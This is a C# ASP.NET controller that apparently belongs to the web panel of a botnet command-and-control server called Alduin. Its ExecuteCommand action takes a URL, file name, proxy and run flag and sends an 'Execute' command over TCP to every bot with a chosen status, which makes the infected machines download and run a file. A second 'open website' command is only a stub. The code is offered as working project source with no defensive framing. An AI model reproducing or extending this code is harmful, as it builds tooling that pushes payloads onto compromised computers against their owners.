using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Alduin.Server.Commands;
using Alduin.Web.Models;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Mvc;
using Alduin.Server.Handler;
using MediatR;
using Alduin.Logic.Mediator.Queries;
using Alduin.Shared.DTOs;

namespace Alduin.Web.Controllers
{
    public class CommandsController : ControllerBase
    {
        private readonly IMediator _mediator;


        public CommandsController(IMediator mediator)
        {
            _mediator = mediator;
        }

        [Authorize]
        public IActionResult Index()
        {
            return View();
        }
        [Authorize]
        [HttpGet]
        public IActionResult ExecuteFile()
        {
            return PartialView("_ExecuteFile");
        }
        [Authorize]
        [HttpGet]
        public IActionResult OpenWebsite()
        {
            return PartialView("_OpenWebsite");
        }
        [Authorize]
        [HttpPost]
        public async Task<IActionResult> ExecuteCommand(ExecuteModel model)
        {
            if (!ModelState.IsValid)
                return View(model);
            var command = new ExecuteCommand
            {
                Method = "Execute",
                Url = model.Url,
                Name = model.Name,
                Proxy = model.Proxy,
                Run = model.Run,
            };
            var bots = new GetBotsByStatusQuery { 
                status = model.Force
            };
            var botlist = await _mediator.Send(bots);
            var response = CommandExecute.TcpConnects(botlist, command);
            return Json(response);
        }
        [Authorize]
        [HttpPost]
        public IActionResult WebOpenCommand(WebsiteModel model)
        {
            if (!ModelState.IsValid)
                return View(model);

            return Json(true);
        }
    }
}